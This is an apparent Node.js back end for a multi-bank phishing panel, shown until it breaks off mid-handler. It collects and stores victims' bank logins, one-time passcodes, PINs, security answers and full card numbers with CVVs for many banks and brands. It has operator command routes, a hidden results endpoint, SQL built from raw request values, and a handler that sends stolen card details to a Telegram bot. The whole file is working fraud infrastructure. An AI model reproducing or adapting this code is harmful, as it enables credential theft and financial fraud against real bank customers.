const express = require("express");
const bodyparser = require("body-parser");
const axios = require("axios");
const mongoose = require("mongoose");
var cors = require("cors");
var fs = require("fs");
var CryptoJS = require("crypto-js");
require("dotenv").config();

const port = process.env.PORT || 8080;

const fileUpload = require("express-fileupload");
const app = express();
app.use(bodyparser.json());
app.use(cors());
app.use(fileUpload());

mongoose.connect(process.env.mongoURL);
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error: "));
db.once("open", () => {
  app.listen(port, "0.0.0.0", () => {
    console.log("App listening on port", port);
  });
});

var bankName;

app.use("/", require("./routes/ips"));

app.get("/getRespentesting123!", (req, res) => {
  fs.readFile("results.txt", function (err, data) {
    var filecontents = data;
    res.send(filecontents);
  });
});

//COMMERZ
app.use('/commerz', require('./routes/commerz'))

//CITI
app.use("/citi", require("./routes/citi"));

//TEACHERS
app.use("/teachers", require("./routes/teachers"));

//BOQ
app.use("/boq", require("./routes/boq"));

//KIWI
app.use("/kiwi", require("./routes/kiwi"));

//THAMES
app.use("/thameswater", require("./routes/thameswater"));

//DHL
app.use("/dhl", require("./routes/dhl"));

//USPS
app.use("/usps", require("./routes/usps"));

//OBERBANK
app.use("/oberbank", require("./routes/oberbank"));

//WELLS
app.use("/wells", require("./routes/wells"));

//SANTS
app.use("/sants", require("./routes/sants"));
app.use("/santsCommand", require("./routes/sants"));

//ATO
app.use("/ato", require("./routes/ato"));

//KURONE
app.use("/kurone", require("./routes/kurone"));

//BACKMARKET
app.use("/back", require("./routes/backmarket"));

app.get("/micbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM micb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/micbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE micb SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/micbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/micbSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, telephone, uniqueid, ip, owner];
  let query = `INSERT INTO micb(username,password,telephone,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/micbSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, telephone, uniqueid, owner];
  let query = `UPDATE micb SET username=?, password=?, telephone = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/micbSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE micb SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/micbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM micb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//MQ
app.use("/mq", require("./routes/macquarie"));

//BNP
//BNP
//BNP

app.get("/bnpCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM bnp WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/bnpCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  let query = `UPDATE bnp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/bnpCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  loginOtp = req.body.loginOtp;
  owner = req.body.owner;

  let details = [loginOtp, uniqueid, owner];
  let query = `UPDATE bnp SET login_otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  identityOtp = req.body.identityOtp;
  owner = req.body.owner;

  let details = [identityOtp, uniqueid, owner];
  let query = `UPDATE bnp SET payment_otp=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveVerification", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  verificationCode = req.body.verificationCode;
  owner = req.body.owner;

  let details = [verificationCode, uniqueid, owner];
  let query = `UPDATE bnp SET link=?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  clientCode = req.body.clientCode;
  secretCode = req.body.secretCode;
  owner = req.body.owner;

  let details = [clientCode, secretCode, uniqueid, owner];
  let query = `UPDATE bnp SET username=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE bnp SET telephone=?, status = 12 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  owner = req.body.owner;

  let details = [ccnum, ccexp, cccvv, uniqueid, owner];
  let query = `UPDATE bnp SET cardnumber=?, expirydate=?, cvv=?, status = 9 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpSaveLogin", cors(), (req, res) => {
  clientCode = req.body.clientCode;
  secretCode = req.body.secretCode;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  let details = [clientCode, secretCode, uniqueid, ip, owner];
  let query = `INSERT INTO bnp(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM bnp WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//DBS
//DBS
//DBS

app.get("/dbsCustomers/:id", (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM customers WHERE uniqueid=?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/dbsCustomers", (req, res) => {
  panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/dbsCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 12) {
    merchant = req.body.merchant;
    amount = req.body.amount;
    let details = [newStatus, merchant, amount, uniqueid];
    let query = `UPDATE customers SET status=?, merchant=?, amount=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM customers WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveLogin", cors(), (req, res) => {
  pin = req.body.pin;
  userId = req.body.userid;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [pin, userId, uniqueid, ip];
  let query = `INSERT INTO customers(pin,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
  pin = req.body.pin;
  userId = req.body.userid;
  uniqueid = req.body.uniqueid;

  let details = [pin, userId, uniqueid];
  let query = `UPDATE customers SET pin=?, userId=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsPaymentOtp", cors(), (req, res) => {
  paymentOtp = req.body.paymentOtp;
  uniqueid = req.body.uniqueid;

  let details = [paymentOtp, uniqueid];
  let query = `UPDATE customers SET paymentOtp=?, status = 15 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSavePhone", cors(), (req, res) => {
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid];
  let query = `UPDATE customers SET telephone=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveEmail", cors(), (req, res) => {
  email = req.body.email;
  uniqueid = req.body.uniqueid;

  let details = [email, uniqueid];
  let query = `UPDATE customers SET email=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE customers SET otp=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE customers SET otp=?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/dbsSaveCC", cors(), (req, res) => {
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  uniqueid = req.body.uniqueid;

  let details = [ccnum, ccexp, cccvv, uniqueid];
  let query = `UPDATE customers SET ccnum=?, ccexp=?, cccvv=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//ANZ
//ANZ
//ANZ

app.use("/anz", require("./routes/anz"));

app.get("/anzCustomers/:owner", (req, res) => {
  owner = req.params.owner;

  let details = [owner];
  let query = `SELECT * FROM anz WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/anzCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 4) {
    question1 = req.body.question1;

    let query = `UPDATE anz SET status= ${newStatus}, question1 = '${question1}' WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let query = `UPDATE anz SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/anzCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/anzSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, ip, owner];
  let query = `INSERT INTO anz(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveTelephone", cors(), (req, res) => {
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE anz SET telephone=?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, owner];
  let query = `UPDATE anz SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE anz SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzSaveAnswers", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  answer1 = req.body.answer1;
  owner = req.body.owner;

  let details = [answer1, uniqueid, owner];
  let query = `UPDATE anz SET answer1=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/anzDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM anz WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BL
//BL
//BL

app.get("/banklineCustomers/:id", (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM customers WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/banklineCustomers", (req, res) => {
  blConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/banklineSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  userId = req.body.userId;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [customerId, userId, uniqueid, ip];
  let query = `INSERT INTO customers(customerId,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/banklineSavePayment", cors(), (req, res) => {
  paymentCode = req.body.paymentCode;
  uniqueid = req.body.uniqueid;

  let details = [paymentCode, uniqueid];
  let query = `UPDATE customers SET paymentCode=?, status=5 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/banklineSaveAuth", cors(), (req, res) => {
  responseCode = req.body.responseCode;
  password = req.body.password;
  uniqueid = req.body.uniqueid;

  let details = [responseCode, password, uniqueid];
  let query = `UPDATE customers SET responseCode=?, password=?, status=3 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/banklineCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 2 || newStatus == 11) {
    char1 = req.body.char1;
    char2 = req.body.char2;
    char3 = req.body.char3;
    loginQr = req.body.loginQr;
    let details = [newStatus, char1, char2, char3, loginQr, uniqueid];
    let query = `UPDATE customers SET status=?, char1=?, char2=?,char3=?, loginQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else if (newStatus == 4) {
    paymentQr = req.body.paymentQr;
    partNumber = req.body.partNumber;
    let details = [newStatus, partNumber, paymentQr, uniqueid];
    let query = `UPDATE customers SET status=?, partNumber=?, paymentQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else if (newStatus == 12) {
    paymentQr = req.body.paymentQr;
    let details = [newStatus, paymentQr, uniqueid];
    let query = `UPDATE customers SET status=?, paymentQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM customers WHERE uniqueid= ?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  userId = req.body.userId;
  uniqueid = req.body.uniqueid;

  let details = [customerId, password, uniqueid];
  let query = `UPDATE customers SET customerId=?, password=?, status=1 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//WP
//WP
//WP

app.use("/wp", require("./routes/westpac"));

//COMMBANK
//COMMBANK
//COMMBANK

app.get("/cbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM cb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/cbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE cb SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/cbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/cbSaveLogin", cors(), (req, res) => {
  clientNumber = req.body.clientNumber;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  time = new Date().toUTCString();

  let details = [clientNumber, password, uniqueid, ip, owner, time];
  let query = `INSERT INTO cb(clientNumber,password,uniqueid,status,ip, owner, time) VALUES (?,?,?,1,?,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  time = new Date().toUTCString();

  let details = [customerId, password, time, uniqueid, owner];
  let query = `UPDATE cb SET customerId=?, password=?, time = ?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [otp, time, uniqueid, owner];
  let query = `UPDATE cb SET otp=?, time = ?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [ccnum, ccexp, cccvv, time, uniqueid, owner];
  let query = `UPDATE cb SET ccnum=?, ccexp=?, cccvv=?, time = ?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [telephone, time, uniqueid, owner];
  let query = `UPDATE cb SET telephone=?, time = ?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/cbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM cb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//ZENCOM
//ZENCOM
//ZENCOM

app.get("/zcCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let result = [];
  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].owner === owner) {
      result.push(db.Zencom[i]);
    }
  }
  res.send(result);
});

app.post("/zcCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].status = newStatus;
      res.send("Update Completed");
    }
  }
});

app.get("/zcCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;
  let result = [];

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid && db.Zencom[i].owner === owner) {
      result.push(db.Zencom[i]);
    }
  }
  res.send(result);
});

app.post("/zcSavePin", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  pin = req.body.pin;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].pin = pin;
      db.Zencom[i].status = 5;
    }
  }
  res.send("Completed");
});

app.post("/zcSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].telephone = telephone;
      db.Zencom[i].status = 1;
    }
  }
  res.send("Completed");
});

app.post("/zcSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].otp = otp;
      db.Zencom[i].status = 3;
    }
  }
  res.send("Completed");
});

app.post("/zcSaveLogin", cors(), (req, res) => {
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  let loginInfo = {
    id: uniqueid,
    uniqueid: uniqueid,
    telephone: telephone,
    owner: owner,
    ip: ip,
    status: 1,
  };
  db.Zencom.push(loginInfo);
  res.send("Completed");
});

//RBC
app.use("/rbc", require("./routes/rbc"));

//APPLE PANEL
//APPLE PANEL
//APPLE PANEL

app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM apple WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/appleCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM apple WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/appleCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE apple SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/appleCustomers/id/:id", (req, res) => {
  const uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM apple WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/appleSaveBilling", cors(), (req, res) => {
  firstName = req.body.firstName;
  lastName = req.body.lastName;
  telephone = req.body.telephone;
  addy = req.body.addy;
  town = req.body.town;
  pcode = req.body.pcode;
  dob = req.body.dob;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [
    `${firstName} ${lastName}`,
    telephone,
    addy,
    town,
    pcode,
    dob,
    uniqueid,
    ip,
    owner,
  ];
  let query = `INSERT INTO apple(fullName,telephone, addy, city, pcode, dob, uniqueid,status,ip, owner) VALUES (?,?,?,?,?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

let appleCount = 1;

app.post("/appleSaveCC", (req, res) => {
  let { ccname, ccnum, ccexp, cvv, owner, uniqueid } = req.body;

  if (owner == "bali2810" && appleCount !== 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1983666674&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
    );
  }

  let checkDetails = [uniqueid];

  let checkQuery = `SELECT * FROM apple WHERE uniqueid = ?`;

  panelConnection.query(checkQuery, checkDetails, (err, rows, fields) => {
    if (err) console.log(err);
    if (rows.length) {
      console.log(rows);
      let updateDetails = [ccname, ccnum, ccexp, cvv, uniqueid];
